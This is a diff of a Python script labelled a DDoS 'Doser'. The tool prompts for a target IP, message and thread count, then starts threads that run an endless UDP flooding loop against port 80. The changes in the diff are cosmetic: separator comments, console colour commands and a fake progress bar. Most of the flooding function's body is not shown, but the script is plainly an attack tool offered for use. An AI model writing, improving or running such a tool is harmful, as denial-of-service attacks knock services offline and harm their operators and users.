@@ -1,8 +1,5 @@
-#importing
 import time,socket,sys,os,_thread
-
-
-
+#=================================================================================================
 
 #color
 class color:
@@ -13,7 +10,10 @@ class color:
     abi_kamrang = '\033[94m'
 
 
+#=================================================================================================
+
 #update
+os.system("color C")
 update = input(color.red+'       Update Doser    n/y  ?   ')
 fake_ip = "40.56.10.2"
 counter = 0
@@ -63,8 +63,8 @@ if update == ('n') or update == ('N'):
     print('')
 
 
-
-
+#=================================================================================================
+os.system("color A")
 os.system('cls' or 'clear')
 print('')
 print("############################################################################")
@@ -100,13 +100,27 @@ UDP_PORT = 80
 MESSAGE = input(color.abi_kamrang+'      Enter message =>  ')
 print(color.sefid+'------------------------------------------------------------')
 time.sleep(2)
-os.system('clear' or 'cls')
-print(color.sabz+'''         \tS T A R T I N G    D D O S E R ''')
+print("")
+print(color.red+" [       ] 0%")
+time.sleep(1)
+print(color.abi_kamrang+" [=======   ] 20%")
+time.sleep(0.6)
+print(color.abi_kamrang+" [============ ] 40%")
+time.sleep(0.5)
+print(color.abi_kamrang+" [================ ] 60%")
+time.sleep(0.8)
+print(color.abi_kamrang+" [==================== ] 80%")
+time.sleep(0.6)
+print(color.abi_kamrang+" [========================= ] 100%")
+os.system('cls' or 'clear' )
+print('''starting...''')
 print('')
 print(color.sefid+'------------------------------------------------------------')
 print(color.sabz+"UDP target IP:", ip)
 print(color.sabz+"UDP target port:", UDP_PORT)
 time.sleep(5)
+
+#=================================================================================================
 
 def ddos(i):
     while 1:
@@ -120,3 +134,4 @@ for i in range(int(thread_count)):
         sys.exit(0)
 while 1:
     pass
+#=================================================================================================
